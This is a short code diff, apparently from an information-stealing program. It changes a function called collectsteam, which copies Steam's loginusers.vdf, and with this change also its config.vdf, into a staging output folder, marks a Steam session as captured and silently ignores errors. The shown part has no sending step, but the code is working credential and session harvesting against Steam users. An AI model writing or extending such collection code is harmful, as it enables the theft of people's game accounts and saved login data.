@@ -1009,11 +1009,13 @@ def collectsteam():
         global steam_session
         steampath = os.path.join(os.getenv('programfiles(x86)'), 'Steam')
         loginpaath = os.path.join(steampath, 'config', 'loginusers.vdf')
+        cfgpath = os.path.join(steampath, 'config', 'config.vdf')
         steamoutput = os.path.join(output, 'Steam')
         if os.path.exists(steampath):
             try:
                 os.makedirs(steamoutput, exist_ok=True)
                 shutil.copy2(loginpaath, os.path.join(steamoutput, os.path.basename(loginpaath)))
+                shutil.copy2(cfgpath, os.path.join(steamoutput, os.path.basename(cfgpath)))
                 steam_session = 1
             except:
                 pass
